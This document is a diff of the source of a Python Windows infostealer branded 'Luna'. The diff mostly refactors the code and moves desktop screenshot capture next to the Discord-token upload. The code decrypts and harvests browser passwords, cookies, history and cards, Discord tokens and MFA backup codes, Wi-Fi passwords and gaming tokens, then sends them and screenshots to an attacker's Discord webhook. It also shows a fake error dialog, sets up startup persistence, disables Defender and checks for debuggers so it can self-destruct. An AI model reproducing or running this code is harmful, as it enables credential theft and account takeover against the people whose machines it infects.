@@ -29,10 +29,11 @@ __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
 
+
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
-    threads = [browsers, ss, grabwifi, mc_tokens, epicgames_data, mfa_codes, fakeerror, startup, disable_defender]
+    threads = [browsers, grabwifi, mc_tokens, epicgames_data, mfa_codes, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -92,7 +93,7 @@ def configcheck(list):
 
 
 def fakeerror():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occured while importing modules.")
+    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while importing modules.', 'Fatal Error', 0)
 
 
 def startup():
@@ -115,8 +116,8 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
     return path
 
 
-class grabpcinfo():
-    def __init__(self) -> None:
+class grabpcinfo:
+    def __init__(self):
         self.get_inf(__WEBHOOK__)
 
     def get_inf(self, webhook):
@@ -137,9 +138,10 @@ class grabpcinfo():
 
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
+
 @try_extract
-class grabtokens():
-    def __init__(self) -> None:
+class grabtokens:
+    def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -152,7 +154,7 @@ class grabtokens():
         self.grabTokens()
         self.upload(__WEBHOOK__)
 
-    def decrypt_val(self, buff, master_key) -> str:
+    def decrypt_val(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
@@ -163,7 +165,7 @@ class grabtokens():
         except Exception:
             return "Failed to decrypt password"
 
-    def get_master_key(self, path) -> str:
+    def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -355,12 +357,32 @@ class grabtokens():
             embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
             embed.set_thumbnail(url=avatar)
 
-            webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+            webhook.send(
+                embed=embed,
+                avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                username="Luna")
             self.tokens_sent += token
 
+        ImageGrab.grab(
+            bbox=None,
+            all_screens=True,
+            include_layered_windows=False,
+            xdisplay=None
+        ).save(tempfolder + "\\image.png")
+
+        embed2 = Embed(title="Desktop Screenshot", color=5639644)
+        file = File(tempfolder + "\\image.png", filename="image.png")
+        embed2.set_image(url="attachment://image.png")
+
+        webhook.send(
+            embed=embed2,
+            file=file,
+            username="Luna")
+
+
 @try_extract
-class browsers():
-    def __init__(self) -> None:
+class browsers:
+    def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
         self.browsers = {
@@ -429,27 +451,27 @@ class browsers():
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
 
-    def passwords(self, name: str, path: str, profile: str) -> None:
-            path += '\\' + profile + '\\Login Data'
-            if not os.path.isfile(path):
-                return
+    def passwords(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
 
-            loginvault = create_temp()
-            copy2(path, loginvault)
-            conn = sqlite3.connect(loginvault)
-            cursor = conn.cursor()
-            with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
-                f.write(f"\nBrowser: {name}\n")
-                for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
-                    url, username, password = res
-                    password = self.decrypt_password(password, self.masterkey)
-                    if url != "":
-                        f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
-            cursor.close()
-            conn.close()
-            os.remove(loginvault)
+        loginvault = create_temp()
+        copy2(path, loginvault)
+        conn = sqlite3.connect(loginvault)
+        cursor = conn.cursor()
+        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
+            f.write(f"\nBrowser: {name}\n")
+            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                url, username, password = res
+                password = self.decrypt_password(password, self.masterkey)
+                if url != "":
+                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
+        cursor.close()
+        conn.close()
+        os.remove(loginvault)
 
-    def cookies(self, name: str, path: str, profile: str) -> None:
+    def cookies(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
@@ -469,7 +491,7 @@ class browsers():
         conn.close()
         os.remove(cookievault)
 
-    def history(self, name: str, path: str, profile: str) -> None:
+    def history(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
@@ -511,14 +533,6 @@ class browsers():
         conn.close()
         os.remove(cardvault)
 
-@try_extract
-def ss():
-    ImageGrab.grab(
-        bbox=None,
-        include_layered_windows=False,
-        all_screens=True,
-        xdisplay=None
-    ).save(tempfolder + "\\desktop-screenshot.png")
 
 @try_extract
 class grabwifi:
@@ -557,8 +571,9 @@ class grabwifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
+
 @try_extract
-class mc_tokens():
+class mc_tokens:
     def __init__(self):
         self.roaming = os.getenv("appdata")
         self.accounts_path = "\\.minecraft\\launcher_accounts.json"
@@ -587,8 +602,9 @@ class mc_tokens():
             else:
                 f.write(self.error_message)
 
+
 @try_extract
-class epicgames_data():
+class epicgames_data:
     def __init__(self):
         self.local = os.getenv("localappdata")
         self.epic = self.local + \
@@ -608,8 +624,9 @@ class epicgames_data():
             else:
                 g.write("No epic games data was found :(")
 
+
 @try_extract
-class mfa_codes():
+class mfa_codes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
         self.code_path = '\\Downloads\\discord_backup_codes.txt'
@@ -700,12 +717,12 @@ class debug:
     global tempfolder
     tempfolder = mkdtemp()
 
-    def __init__(self) -> None:
+    def __init__(self):
 
         if self.checks():
             self.self_destruct()
 
-    def checks(self) -> bool:
+    def checks(self):
         debugging = False
 
         self.blackListedUsers = [
